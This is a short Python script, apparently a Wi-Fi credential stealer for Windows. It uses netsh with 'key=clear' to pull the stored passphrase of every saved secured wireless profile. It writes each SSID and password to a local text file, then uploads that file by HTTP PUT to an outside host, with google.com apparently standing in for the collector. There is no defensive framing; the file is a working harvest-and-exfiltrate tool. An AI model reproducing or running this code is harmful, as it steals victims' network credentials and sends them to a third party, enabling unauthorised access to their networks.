import subprocess
import re
import requests

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode('Windows-1251')

profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()

if len(profile_names):
    for name in profile_names:
        wifi_profile = dict()
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True)\
            .stdout.decode('Windows-1251')
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            wifi_profile["ssid"] = name
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
                                               capture_output=True).stdout.decode('Windows-1251')
            password = re.search("Key Content            : (.*)\r", profile_info_pass)

            if password == None:
                wifi_profile["password"] = None
            else:
                wifi_profile["password"] = password[1]

            wifi_list.append(wifi_profile)


with open('../WiFi.txt', 'w+') as fish:
    for x in wifi_list:
        fish.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")


with open('../WiFi.txt', 'rb') as fish:
    r = requests.put("https://www.google.com", data=fish)
    if r.status_code == 200:
        print('Success')
